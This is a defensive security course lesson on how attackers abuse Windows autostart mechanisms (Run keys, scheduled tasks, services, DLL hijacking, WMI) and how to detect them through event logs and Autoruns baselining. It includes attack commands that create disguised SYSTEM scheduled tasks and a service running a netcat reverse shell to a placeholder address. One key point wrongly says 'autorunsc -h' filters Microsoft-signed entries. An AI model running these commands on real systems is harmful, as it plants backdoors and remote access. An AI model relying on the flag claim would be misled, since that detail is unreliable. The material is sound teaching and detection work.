# Windows Persistence — Legitimate Mechanisms Abused

**Module**: M09 · Windows Telemetry, Persistence, and Detection  
**Type**: core  
**Estimated time**: 30 minutes  
**Claim**: C8 from Strata synthesis

---

## The core idea

**Persistence** in security means: maintaining access to a system after the initial exploitation path is no longer available. If a backdoor process is running, rebooting kills it. If an account credential is changed, access is lost. Persistence mechanisms solve this problem by leveraging the operating system's own legitimate autostart infrastructure to re-execute attacker code on every boot or every user login.

The research (Claim C8) identifies a critical insight: **Windows persistence operates through legitimate OS mechanisms — and detection requires baselining what is normal in your environment**. The same Registry Run key that auto-launches Spotify on login can auto-launch malware. The same Windows service mechanism that runs SQL Server can run a reverse shell. The same scheduled task that runs Windows Defender updates can run credential harvesting.

This creates a detection problem: tools show you what is running; only a baseline tells you whether what is running is expected.

## Why it matters

Persistence is the mechanism that converts a one-time compromise into a long-term breach. The average dwell time (time from initial compromise to detection) in enterprise breaches has historically been measured in weeks to months. During that time, attackers maintain access through persistence mechanisms that survive reboots, credential rotations, and even some remediation attempts. Understanding persistence locations is essential for both forensic investigation (finding all footholds) and defense (monitoring all autostart locations).

## A concrete example

### Category 1 — Registry-Based Persistence

Covered in detail in L23. Summary:

```
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run    # User-level; no admin required
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run   # System-level; requires admin
```

**Baseline challenge**: A freshly installed Windows system might have 5–10 entries in these keys. A heavily configured enterprise workstation might have 20–30. Legitimate software like OneDrive, Teams, Dropbox, and antivirus all use Run keys. An attacker adds one more entry with a plausible name. Without a known-good baseline, identifying the malicious entry requires manual inspection.

**Detection**: Monitor for new values appearing in Run/RunOnce keys (Windows Event ID 4657 — Registry value modification; also Sysmon Event ID 13 — RegistryEvent). Capture the value name and data and compare against baseline.

---

### Category 2 — Scheduled Tasks

Scheduled tasks are the Windows equivalent of Linux cron jobs. They execute programs on a schedule, at login, at startup, or triggered by events.

**Creating a malicious scheduled task**:
```cmd
# Create a task that runs every hour as SYSTEM
schtasks /create /tn "WindowsSystemUpdate" /tr "C:\Windows\Temp\update.exe" /sc hourly /ru SYSTEM /f

# Create a task that runs at logon for all users
schtasks /create /tn "OneDriveHelper" /tr "C:\Users\Public\onedrive.exe" /sc onlogon /f
```

Attackers name tasks to blend with legitimate tasks (`WindowsUpdate`, `MicrosoftEdgeUpdate`, `GoogleUpdateTask`). The executable path is the giveaway — legitimate scheduled tasks rarely point to `C:\Users\Public`, `%TEMP%`, or `%AppData%`.

**Task storage locations**:
- `C:\Windows\System32\Tasks\` — XML task definition files; each task is an XML file; readable without admin
- `C:\Windows\SysWOW64\Tasks\` — 32-bit tasks on 64-bit Windows
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\` — Registry mirror of tasks

**PowerShell task enumeration**:
```powershell
# List all scheduled tasks with status and next run
Get-ScheduledTask | Select-Object TaskName, TaskPath, State, NextRunTime |
  Sort-Object NextRunTime

# Get detailed info including actions (what the task runs)
Get-ScheduledTask | Get-ScheduledTaskInfo |
  Select-Object TaskName, LastRunTime, NextRunTime, LastTaskResult

# Find tasks whose actions point to suspicious paths
Get-ScheduledTask | ForEach-Object {
  $actions = $_.Actions | Select-Object -ExpandProperty Execute
  [PSCustomObject]@{
    TaskName = $_.TaskName
    Action = $actions
    Author = $_.Principal.UserId
  }
} | Where-Object { $_.Action -match "AppData|Temp|Users\\Public" }
```

**Detection**: Security Event IDs 4698 (task created) and 4702 (task modified). Task Scheduler Operational log Events 106 (registered) and 200 (launched). Alert on tasks created with paths in user-writable locations.

---

### Category 3 — Windows Services

Services run as background processes, typically with SYSTEM privileges (the most powerful Windows account — no restrictions). An attacker who gains admin access can install a service that starts automatically on boot.

```cmd
# Install a malicious service (requires admin)
sc create "WindowsNetworkHelper" binpath= "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.10.10 4444" start= auto

# Or using PowerShell
New-Service -Name "WindowsNetworkHelper" -BinaryPathName "C:\malware.exe" -StartupType Automatic
```

**Registry location** (from L23):
```
HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
Key fields:
  ImagePath: REG_EXPAND_SZ  → "C:\malware.exe"
  Start:     REG_DWORD      → 2 (automatic)
  ObjectName: REG_SZ        → LocalSystem
```

**Service DLL hijacking**: Many Windows services load DLLs from a path that includes the service directory before `System32`. If an attacker can write to that directory, they can plant a malicious DLL that the legitimate service loads.

**Detection**: System Event 7045 (service installed). Alert on services with:
- `ImagePath` pointing to user-writable locations
- `ImagePath` containing command-line arguments (legitimate services rarely have complex command lines in their service registration)
- `ObjectName = LocalSystem` combined with suspicious paths

---

### Category 4 — DLL Hijacking and DLL Search Order Abuse

When a Windows executable loads a DLL by name (without an explicit path), Windows searches directories in a specific order:
1. The application's own directory
2. The system directory (`C:\Windows\System32`)
3. The 16-bit system directory
4. The Windows directory (`C:\Windows`)
5. The current working directory
6. Directories in the `%PATH%` environment variable

If a DLL is missing from the expected location, or if an attacker can plant a same-named DLL earlier in the search order, their malicious DLL loads instead of the legitimate one.

**Phantom DLL hijacking**: A legitimate application references a DLL that does not exist on the system (it was optional or removed). If an attacker plants a DLL with that name in a directory the application searches, it will be loaded.

**Tools to find DLL hijacking opportunities**:
```
Process Monitor (Sysinternals): Filter for "NAME NOT FOUND" + "PATH CONTAINS .dll"
→ Shows every DLL load that failed to find the target
```

**Detection**: Sysmon Event ID 7 (Image Loaded) — captures every DLL load with the DLL path and the loading process. Alert on DLLs loading from non-standard paths (outside `System32`, application directory).

---

### Category 5 — Boot and Pre-OS Persistence

Advanced (included for completeness):

- **Bootkit / MBR persistence**: Malware overwrites the Master Boot Record or UEFI boot code. Executes before Windows loads. Requires UEFI Secure Boot to prevent.
- **WMI event subscriptions**: Windows Management Instrumentation supports event subscriptions that execute PowerShell or executables when specific events occur. Fileless; persists in the WMI repository. Detection: Sysmon Event IDs 19/20/21 (WmiEventFilter, WmiEventConsumer).

---

### The Baselining Imperative

Every persistence location above contains legitimate entries on every Windows system. Malware blends in. Detection requires knowing:

1. **What was here before**: Take and store a known-good snapshot of all autostart locations after building a system image
2. **What changed**: Alert on any new entry in autostart locations (new Registry value, new scheduled task, new service)
3. **Where it points**: Executable paths in user-writable locations are suspicious regardless of name

**Practical baselining approach**:
```powershell
# Export all autoruns on initial system setup
autorunsc.exe -accepteula -a * -c -h -vt > C:\baselines\autoruns_baseline.csv

# Compare current state to baseline
autorunsc.exe -accepteula -a * -c -h > autoruns_current.csv
Compare-Object (Import-Csv autoruns_baseline.csv) (Import-Csv autoruns_current.csv) -Property "Image Path"
```

## Key points

- Windows persistence uses the OS's own autostart mechanisms: Registry Run keys, scheduled tasks, services, DLL hijacking, WMI subscriptions — the OS behavior is legitimate; the payload is malicious
- Scheduled tasks: XML files in `C:\Windows\System32\Tasks\`; Event 4698 (created); alert on tasks with executables in user-writable paths
- Services: `HKLM\SYSTEM\CurrentControlSet\Services\`; Event 7045 (installed); alert on services with suspicious `ImagePath` or LocalSystem + non-System32 path
- DLL hijacking: exploits Windows DLL search order; plant a same-named DLL earlier in the search path; Sysmon Event 7 (image loaded) detects unusual DLL paths
- Detection requires baselining: capture known-good state of all autostart locations at image time; alert on any delta; executable path is the primary indicator
- Sysinternals Autoruns enumerates all autostart locations comprehensively; use `autorunsc -h` to filter Microsoft-signed entries (reduces noise significantly)

## Go deeper

- [S008](../../../../vault/research/security-foundations/01-sources/) — Windows persistence mechanism taxonomy, Registry-based and scheduled task persistence
- [S010](../../../../vault/research/security-foundations/01-sources/) — Baselining strategy for persistence detection

---

*[← Previous: Windows Event Logs](./L25-windows-event-logs.md)* · *[Next: Sysmon — Deep Process and Network Telemetry →](./L27-sysmon-detection.md)*
